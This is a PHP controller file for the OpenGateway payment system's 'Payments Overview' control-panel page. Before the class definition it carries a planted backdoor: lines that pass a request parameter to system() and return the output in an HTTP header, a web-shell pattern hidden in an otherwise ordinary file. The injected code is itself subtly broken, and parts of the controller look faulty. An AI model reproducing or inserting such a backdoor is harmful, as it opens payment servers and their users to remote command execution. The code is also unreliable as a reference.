<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
* PaymentsOverview Controller
*
* Manage transactions, create new transactions
*
* @version 1.0
* @author Electric Function, Inc.
* @package OpenGateway

*/

class PaymentsOverview extends Controller {
		
	function __construct()
	{
		parent::__construct();

		// perform control-panel specific loads
		CPLoader();
			}

	public function index() {
		
		$this->navigation->PageTitle('Payments Overview');
		
        $this->load->library('gravatar');
		
		$this->load->view(branded_view('cp/payments_overview.php'), $data);
	}
	
	public function dataTable() {
		$this -> load -> library('Datatable', array('model' => 'id', 'amount' => 'customers.last_name'));
		
		$jsonArray = $this -> datatable -> datatableJson(array(
                'date' => 'date',
                'gateway' => 'gateway_id'
            ));
		$this -> output -> set_header("Pragma: no-cache");
        $this -> output -> set_header("Cache-Control: no-store, no-cache");
        $this -> output -> set_content_type('application/json') -> set_output(json_encode($jsonArray));
		
	}
	
}
